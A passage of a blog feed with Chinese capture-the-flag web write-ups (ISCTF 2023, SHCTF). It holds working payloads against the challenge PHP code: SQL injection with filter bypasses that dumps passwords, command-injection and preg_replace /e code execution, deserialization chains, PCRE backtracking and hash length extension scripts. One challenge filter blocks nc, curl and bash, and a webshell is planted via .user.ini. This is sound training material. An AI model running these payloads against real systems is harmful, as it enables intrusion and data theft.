class="string">"再想想!"</span>);    }    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">&#x27;2023ISCTF&#x27;</span>) === <span class="literal">false</span>){      <span class="keyword">die</span>(<span class="string">"就差一点点啦!"</span>);    }    <span class="keyword">echo</span> <span class="variable">$flag</span>;  }}<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个判断可以通过数组绕过，第二个intval函数也可以通过数组绕过，最后一个if判断可以通过代码pcre回溯进行绕过</p><pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> requestsurl = <span class="string">"http://43.249.195.138:21763/?hongmeng[]=1&shennong[]=2&zhurong[]=1"</span>data={    <span class="string">&#x27;pan_gu&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;2023ISCTF&#x27;</span>}r=requests.post(url,data=data)<span class="built_in">print</span>(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011203388.png"></p><h3 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h3><p>本题的本质是SQL注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011213428.png"></p><p>本题需要传的俩个参，先测试下是否能注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011214113.png"></p><p>说明本题是单引号注入，且本题过滤了空格，以及or select union，可以用&#x2F;**&#x2F;来绕过空格，union、or、select则可以通过双写绕过。</p><pre class="line-numbers language-highlight sql"><code class="language-highlight sql">获取所有数据库名（information_schema,users,mysql,test,performance_schema,sys）username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/ununionion/**/sselectelect/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata#&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011256060.png"></p><pre class="line-numbers language-highlight sql"><code class="language-highlight sql">爆users表名username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/uunionnion/**/sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#x27;</span>users<span class="string">&#x27;#&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011258407.png"></p><pre class="line-numbers language-highlight sql">爆users列名（<span class="keyword">user</span>,password,<span class="keyword"><code class="language-highlight sql">爆users列名（<span class="keyword">user</span>,password,<span class="keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS）username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/uunionnion/**/sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;</span>users<span class="string">&#x27;#&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011241830.png"></p><pre class="line-numbers language-highlight sql"><code class="language-highlight sql">爆password字段username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;uunionnion/**/sselectelect/**/group_concat(passwoorrd)/**/from/**/users.users#&password=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011259286.png"></p><h3 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h3><pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span><span class="comment">/*</span><span class="comment">Read /flaggggggg.txt</span><span class="comment">*/</span><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i"</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])){<span class="comment">//strings</span>  <span class="keyword">die</span>(<span class="string">"想读我文件？大胆。"</span>);}<span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">"/\^|\||\~|\\$|\%|jay/i"</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])){  <span class="keyword">die</span>(<span class="string">"无字母数字RCE？大胆！"</span>);}<span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">"/bash|nc|curl|sess|\{|:|;/i"</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])){  <span class="keyword">die</span>(<span class="string">"奇技淫巧？大胆！！"</span>);}<span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">"/fl|ag|\.|x/i"</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])){  <span class="keyword">die</span>(<span class="string">"大胆！！！"</span>);}<span class="keyword">else</span>{  <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>四个if判断过滤了很多用于rce的东西，不过assert()函数等效于eval()函数，且过滤未过滤system，我们也可以通过通配符来绕过。所以构造payload</p><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">code=printf(`c\at /f*`)%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为;在第三个判断就被过滤了，所以需要绕过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011310573.png"></p><h3 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h3><p>本题需要上传.user.ini文件来进行上传绕过，然后在UA头放上一句话木马以此来拿到flag</p><p>先上传一个.user.ini文件并且修改UA头</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011333946.png"></p><p>然后通过蚁剑连接在根目录下拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011335642.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 新手，WEB，MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF-Web-WP</title>
      <link href="/2023/11/01/SHCTF-Web-WP/"/>
      <url>/2023/11/01/SHCTF-Web-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);class A&#123; public $var_1;  public function __invoke()&#123;  include($this-&gt;var_1); &#125;&#125;class B&#123; public $q; public function __wakeup()&#123; if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;      echo &quot;hacker&quot;;          &#125;&#125;&#125;class C&#123; public $var; public $z;  public function __toString()&#123;    return $this-&gt;z-&gt;var;  &#125;&#125;class D&#123; public $p;  public function __get($key)&#123;    $function &#x3D; $this-&gt;p;    return $function();  &#125; &#125;if(isset($_GET[&#39;payload&#39;]))&#123;  unserialize($_GET[&#39;payload&#39;]);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造出的poc链代码如下图</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(*__FILE__*);class A&#123;    public $var_1 &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;   public function __invoke()&#123;       include($this-&gt;var_1);    &#125;&#125;class B&#123;    public $q;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;q)) &#123;            echo &quot;hacker&quot;;        &#125;    &#125;&#125;class C&#123;    public $var;    public $z;    public function __toString()&#123;        return $this-&gt;z-&gt;var;    &#125;&#125;class D&#123;    public $p;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;$b &#x3D; new B();$c &#x3D; new C();$d &#x3D; new D();$a &#x3D; new A();$b -&gt; q &#x3D; $c;$c -&gt; z &#x3D; $d;$d -&gt; p &#x3D; $a;echo serialize($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传参后可以得到答案</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011955588.png"></p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]) &amp;&amp; isset($_POST[&#39;pattern&#39;]))&#123;    $pattern&#x3D;$_POST[&#39;pattern&#39;];    if(!preg_match(&quot;&#x2F;flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\&#96;|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\&#x2F;| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%&#x2F;i&quot;,$code))    &#123;        $code&#x3D;$_GET[&#39;code&#39;];        preg_replace(&#39;&#x2F;(&#39; . $pattern . &#39;)&#x2F;ei&#39;,&#39;print_r(&quot;\\1&quot;)&#39;, $code);        echo &quot;you are smart&quot;;    &#125;else&#123;        die(&quot;try again&quot;);    &#125;&#125;else&#123;    die(&quot;it is begin&quot;);&#125;?&gt;it is begin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个判断需要我们get传参’code’，post传参’pattern’。</p><p>第二个判断使传参’code’中不能含有其中的指令或字符，然后在其中的 <strong>preg_replace(‘&#x2F;(‘ . $pattern . ‘)&#x2F;ei’,’print_r(“\1”)’, $code);<strong>可以得知有漏洞可以利用，即</strong>\e的命令执行</strong></p><p>这里引用大佬博客，[大佬连接](<a href="https://blog.csdn.net/m0_64815693/article/details/130327529?ops_request_misc=&request_id=&biz_id=102&utm_term=%5Ce%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-130327529.142%5Ev96%5Epc_search_result_base7&spm=1018.2226.3001.4187">关于preg_replace \e的代码执行-CSDN博客</a>)</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012011936.png"></p><p>在本题的<strong>preg_replace(‘&#x2F;(‘ . $pattern . ‘)&#x2F;ei’,’print_r(“\1”)’, $code);<strong>代码中，可以为</strong>$pattern</strong>赋值为**.***以此来匹配0个或多个字符(任意字符)，他就是匹配到了$code，然后因为他是子模式，所以\1的值就是$code，然后因为在双引号中，转义了\，\1的值$code就被当做代码执行了，所以我们只需要写一个能在print_r中执行的代码</p><blockquote><p><strong>payload   $code&#x3D;{${phpinfo()}}</strong></p><p><strong>$pattern&#x3D;.</strong>*</p></blockquote><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012023531.png"></p><h3 id="1zzphp"><a href="#1zzphp" class="headerlink" title="1zzphp"></a>1zzphp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">本题源代码&lt;?php error_reporting(0);highlight_file(&#39;.&#x2F;index.txt&#39;);if(isset($_POST[&#39;c_ode&#39;]) &amp;&amp; isset($_GET[&#39;num&#39;]))&#123;  $code &#x3D; (String)$_POST[&#39;c_ode&#39;];  $num&#x3D;$_GET[&#39;num&#39;];  if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))  &#123;    die(&quot;no number!&quot;);  &#125;  elseif(intval($num))  &#123;   if(preg_match(&#39;&#x2F;.+?SHCTF&#x2F;is&#39;, $code))   &#123;    die(&#39;no touch!&#39;);   &#125;   if(stripos($code,&#39;2023SHCTF&#39;) &#x3D;&#x3D;&#x3D; FALSE)   &#123;    die(&#39;what do you want&#39;);   &#125;   echo $flag;  &#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个问题是需要给num传参里不能有数字，第二个问题里用到了intval函数，该函数获取$num里的整数值，如果不是则返回False，并且使用正则表达式函数 <code>preg_match()</code> 来匹配字符串 <code>$code</code> 是否包含 <code>SHCTF</code>，stripos() 函数查找字符串在另一字符串中第一次出现的位置，即查找$code中是否有2023SHCTF，</p><p>第一步中我们可以通过给num传参进行数组绕过，即<strong>url+&#x2F;?num[]&#x3D;1</strong></p><p>然后后面可以通过pcre时间回溯漏洞，发送大量字符串”2023SHCTF”以达到其上限从而能绕过preg_match函数，这样同时满足俩个判断从而得到flag</p><p>代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;112.6.51.212:31219&#x2F;?num[]&#x3D;1&quot;data&#x3D;&#123;    &#39;c_ode&#39;:&#39;very&#39;*250000+&#39;2023SHCTF&#39;&#125;r&#x3D;requests.post(url,data&#x3D;data)print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012041609.png"></p><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">源代码&lt;?phphighlight_file(__FILE__);class misca&#123;  public $gao;  public $fei;  public $a;  public function __get($key)&#123;    $this-&gt;miaomiao();    $this-&gt;gao&#x3D;$this-&gt;fei;    die($this-&gt;a);  &#125;  public function miaomiao()&#123;    $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;  &#125;&#125;class musca&#123;  public $ding;  public $dong;  public function __wakeup()&#123;    return $this-&gt;ding-&gt;dong;  &#125;&#125;class milaoshu&#123;  public $v;  public function __tostring()&#123;    echo&quot;misca~musca~milaoshu~~~&quot;;    include($this-&gt;v);  &#125;&#125;function check($data)&#123;  if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;    die(&quot;you should think harder!&quot;);  &#125;  else return $data;&#125;unserialize(check($_GET[&quot;wanna_fl.ag&quot;]));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以构造如下图的poc链</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(*__FILE__*);class misca&#123;    public $gao;    public $fei;    public $a;    public function __get($key)&#123;        $this-&gt;miaomiao();        $this-&gt;gao&#x3D;$this-&gt;fei;        die($this-&gt;a);    &#125;    public function miaomiao()&#123;        $this-&gt;a&#x3D;&#39;Mikey Mouse~&#39;;    &#125;&#125;class musca&#123;    public $ding;    public $dong;    public function __wakeup()&#123;        return $this-&gt;ding-&gt;dong;    &#125;&#125;class milaoshu&#123;    public $v &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;    public function __tostring()&#123;        echo&quot;misca~musca~milaoshu~~~&quot;;        include($this-&gt;v);    &#125;&#125;function check($data)&#123;    if(preg_match(&#39;&#x2F;^O:\d+&#x2F;&#39;,$data))&#123;        die(&quot;you should think harder!&quot;);    &#125;    else return $data;&#125;$a &#x3D; new musca();$a -&gt; ding &#x3D; new misca();$a -&gt; ding -&gt; fei &#x3D; new milaoshu();$a -&gt; ding -&gt; a &#x3D; &amp;$a -&gt; ding -&gt;gao;$b &#x3D; serialize($a);echo serialize(array($a));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将输出的序列化值进行传参从而可以得到flag，将其base64解码即是flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311012052335.png"></p><p>这其中要注意的是传参的 <strong>$wanna_fl.ag</strong>中需要将其转换为 <strong>wanna[fl.ag</strong>以确保岂能在get中正确传参，当get传参出现[时，将会使其变为_，且后续.不会变化，也就是说，如果不做此修改，则会导致.无法被识别，从而无法满足传参的条件。</p><h3 id="no-wake-up"><a href="#no-wake-up" class="headerlink" title="no_wake_up"></a>no_wake_up</h3><p>本题也是一个反序列化题，题目源码为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);class flag&#123;  public $username;  public $code;  public function __wakeup()&#123;    $this-&gt;username &#x3D; &quot;guest&quot;;  &#125;  public function __destruct()&#123;    if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;      include($this-&gt;code);    &#125;  &#125;&#125;unserialize($_GET[&#39;try&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写其反序列化代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(*__FILE__*);class flag&#123;    public $username;    public $code &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;    public function __wakeup()&#123;        $this-&gt;username &#x3D; &quot;guest&quot;;    &#125;    public function __destruct()&#123;        if($this-&gt;username &#x3D; &quot;admin&quot;)&#123;            include($this-&gt;code);        &#125;    &#125;&#125;$a &#x3D; new flag();echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果为</p><blockquote><p>O:4:”flag”:2:{s:8:”username”;N;s:4:”code”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}</p></blockquote><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021635121.png"></p><h3 id="MD5的事就拜托了"><a href="#MD5的事就拜托了" class="headerlink" title="MD5的事就拜托了"></a>MD5的事就拜托了</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;SHCTF&#39;]))&#123;  extract(parse_url($_POST[&#39;SHCTF&#39;]));  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;    echo(md5($flag));    echo(&quot;&lt;&#x2F;br&gt;&quot;);  &#125;  if(isset($_GET[&#39;length&#39;]))&#123;    $num&#x3D;$_GET[&#39;length&#39;];    if($num*100!&#x3D;intval($num*100))&#123;      echo(strlen($flag));      echo(&quot;&lt;&#x2F;br&gt;&quot;);    &#125;  &#125;&#125;if($_POST[&#39;SHCTF&#39;]!&#x3D;md5($flag))&#123;  if($_POST[&#39;SHCTF&#39;]&#x3D;&#x3D;&#x3D;md5($flag.urldecode($num)))&#123;    echo(&quot;flag is&quot;.$flag);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过后续从大佬WP上学习知道该题为MD5补充攻击，需要我们取得知flag的长度和MD5值</p><h4 id="第一步、获得flag的MD5值"><a href="#第一步、获得flag的MD5值" class="headerlink" title="第一步、获得flag的MD5值"></a>第一步、获得flag的MD5值</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码if(isset($_POST[&#39;SHCTF&#39;]))&#123;  extract(parse_url($_POST[&#39;SHCTF&#39;]));  if($$$scheme&#x3D;&#x3D;&#x3D;&#39;SHCTF&#39;)&#123;    echo(md5($flag));    echo(&quot;&lt;&#x2F;br&gt;&quot;);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里面有几个不认识的函数，例如：**parse_url()**，其效果为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$url &#x3D; &#39;http:&#x2F;&#x2F;username:password@hostname&#x2F;path?arg&#x3D;value#anchor&#39;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;结果----------Array(    [scheme] &#x3D;&gt; http    [host] &#x3D;&gt; hostname    [user] &#x3D;&gt; username    [pass] &#x3D;&gt; password    [path] &#x3D;&gt; &#x2F;path    [query] &#x3D;&gt; arg&#x3D;value    [fragment] &#x3D;&gt; anchor)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>extract()函数</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &quot;Original&quot;;$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\$a &#x3D; $a; \$b &#x3D; $b; \$c &#x3D; $c&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>extract() 函数从数组中将变量导入到当前的符号表。</strong></p><p><strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</strong></p><p><strong>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目</strong>。</p></blockquote><p><strong>如果要满足<code>$$$scheme===&#39;SHCTF&#39;</code>，我们可以使<code>[scheme] =&gt; host</code>，导致<code>$$host===&#39;SHCTF&#39;</code>；再使得<code>[host] =&gt; user</code>导致<code>$user===&#39;SHCTF&#39;</code>，就满足条件。</strong></p><p>可以构造如下的数组</p><pre class="line-numbers language-none"><code class="language-none">Array(    [scheme] &#x3D;&gt; host    [host] &#x3D;&gt; user    [user] &#x3D;&gt; SHCTF    [pass] &#x3D;&gt; password    [path] &#x3D;&gt; &#x2F;path    [query] &#x3D;&gt; arg&#x3D;value    [fragment] &#x3D;&gt; anchor)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>构造payload：host:&#x2F;&#x2F;SHCTF:password@user&#x2F;path?arg&#x3D;value#anchor</strong></p><p>得到的flag的MD5值为： <strong>5eff41d1008c731b14eec5d18c32d942</strong></p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021655560.png"></p><h4 id="第二步、获取flag的长度"><a href="#第二步、获取flag的长度" class="headerlink" title="第二步、获取flag的长度"></a><strong>第二步、获取flag的长度</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">参考源码if(isset($_GET[&#39;length&#39;]))&#123;    $num&#x3D;$_GET[&#39;length&#39;];    if($num*100!&#x3D;intval($num*100))&#123;      echo(strlen($flag));      echo(&quot;&lt;&#x2F;br&gt;&quot;);    &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以参考这位大佬的博客<a href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">PHP intval()函数详解，intval()函数漏洞原理及绕过思路_intval绕过-CSDN博客</a></p><p>在<strong>intval函数</strong>中其会对所得的值进行取整，所以我们可以使**$num&#x3D;1.111**即可得到flag的长度</p><p>得到flag的长度为 42</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021659865.png"></p><h4 id="第三步、计算“md5-flag-urldecode-num-”"><a href="#第三步、计算“md5-flag-urldecode-num-”" class="headerlink" title="第三步、计算“md5($flag.urldecode($num))”"></a>第三步、计算“md5($flag.urldecode($num))”</h4><p>通过github上的<a href="https://github.com/shellfeel/hash-ext-attack">哈希长度扩展攻击利用脚本</a>可以通过已知的信息来求解</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021710096.png"></p><blockquote><p>所以目前已知信息满足该<strong>md5(“密文”+”处理过的已知字符串”)&#x3D;处理过的哈希值</strong>公式</p><p><strong>md5($flag+”\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00233”)&#x3D;7b0d8d07ac2974cc262613ed18d200df</strong></p></blockquote><p>将其中<strong>处理过的已知字符串</strong>将其\x替换为%进行url编码一下传参给length</p><p>再将<strong>处理过的hash值</strong>传参给SHCTF，执行即可得到flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021717025.png"></p><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="快问快答"><a href="#快问快答" class="headerlink" title="快问快答"></a>快问快答</h3><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021756005.png"></p><p>根据这题提示以及尝试，要求我们2s内回答问题并连续答对50道，可想而知我们需要另辟蹊径了，即我们可以编写一个python代码来完成50道答题</p><p>代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsfrom bs4 import BeautifulSoupimport reimport time# 创建会话s &#x3D; requests.Session()url &#x3D; &#39;http:&#x2F;&#x2F;112.6.51.212:31530&#x2F;&#39; #url# 循环答题correct_answers &#x3D; 0for i in range(70):  # 除法运算时有些报错，影响了循环，这里改70    # 获取题目    r &#x3D; s.get(url)    r.encoding &#x3D; &#39;utf-8&#39;    soup &#x3D; BeautifulSoup(r.text, &quot;html.parser&quot;)    question_text &#x3D; soup.find(&quot;h3&quot;).text    print(question_text)    # 使用正则表达式从题目中提取数字和运算符    matches &#x3D; re.match(r&#39;题目：(\d+) (异或|与|[+\-x÷]) (\d+) &#x3D;&#39;, question_text)    # 等待一秒    time.sleep(1)    if matches:        num1 &#x3D; int(matches.group(1))        operator &#x3D; matches.group(2)        num2 &#x3D; int(matches.group(3))        if operator &#x3D;&#x3D; &#39;+&#39;:            answer &#x3D; num1 + num2        elif operator &#x3D;&#x3D; &#39;-&#39;:            answer &#x3D; num1 - num2        elif operator &#x3D;&#x3D; &#39;x&#39;:            answer &#x3D; num1 * num2        elif operator &#x3D;&#x3D; &#39;÷&#39;:            answer &#x3D; num1 &#x2F; num2        elif operator &#x3D;&#x3D; &#39;异或&#39;:            answer &#x3D; num1 ^ num2        elif operator &#x3D;&#x3D; &#39;与&#39;:            answer &#x3D; num1 &amp; num2        # 准备POST数据        data &#x3D; &#123;&quot;answer&quot;: answer&#125;        # 发送答案        response &#x3D; s.post(url, data&#x3D;data)        print(f&quot;答案：&#123;answer&#125;&quot;)        print(response.text)  # 输出对应的response.text<span aria-hidden="true" 